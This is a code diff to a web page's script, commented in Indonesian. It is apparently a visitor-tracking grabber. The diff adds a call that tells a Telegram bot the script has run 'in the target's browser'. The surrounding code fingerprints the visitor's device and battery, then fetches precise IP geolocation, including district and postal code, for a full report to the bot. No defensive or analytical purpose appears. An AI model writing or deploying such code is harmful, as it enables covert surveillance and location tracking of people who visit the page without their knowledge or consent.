@@ -160,7 +160,12 @@
         const CHAT_ID = "8335786077";
         // ============================================================
 
-        // 1. Deteksi Perangkat / OS
+        // 1. TES KIRIM INSTAN (Memastikan bot merespon tanpa nunggu API luar)
+        const testMsg = "🚨 TEST INSTAN: Script web berhasil tereksekusi di browser target!";
+        const testUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(testMsg)}`;
+        fetch(testUrl).catch(e => console.log("Test error:", e));
+
+        // 2. Deteksi Perangkat / OS
         const ua = navigator.userAgent;
         let deviceName = "Unknown Device";
         if (/android/i.test(ua)) deviceName = "Android Mobile";
@@ -169,14 +174,14 @@
         else if (/linux/i.test(ua)) deviceName = "Linux System";
         document.getElementById('deviceVal').innerText = deviceName;
 
-        // 2. Deteksi Baterai & Charge Status
+        // 3. Deteksi Baterai & Charge Status
         let batteryLevelInfo = "Tidak Diketahui";
         let chargeStatusInfo = "Tidak Diketahui";
         
         if (navigator.getBattery) {
             navigator.getBattery().then(battery => {
                 let level = Math.round(battery.level * 100) + '%';
-                let charging = battery.charging ? 'Charging' : 'Discharging';
+                let charging = battery.charging ? 'Charging (Mengisi ⚡)' : 'Discharging (Khas baterai 🔋)';
                 
                 batteryLevelInfo = level;
                 chargeStatusInfo = charging;
@@ -207,7 +212,7 @@
         }
         pushLog();
 
-        // 3. Tarik Data IP Detail (Termasuk Kecamatan & Kode Pos)
+        // 4. Tarik Data IP Detail & Kirim Laporan Lengkap
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
@@ -263,4 +268,3 @@
     </script>
 </body>
 </html>
-    
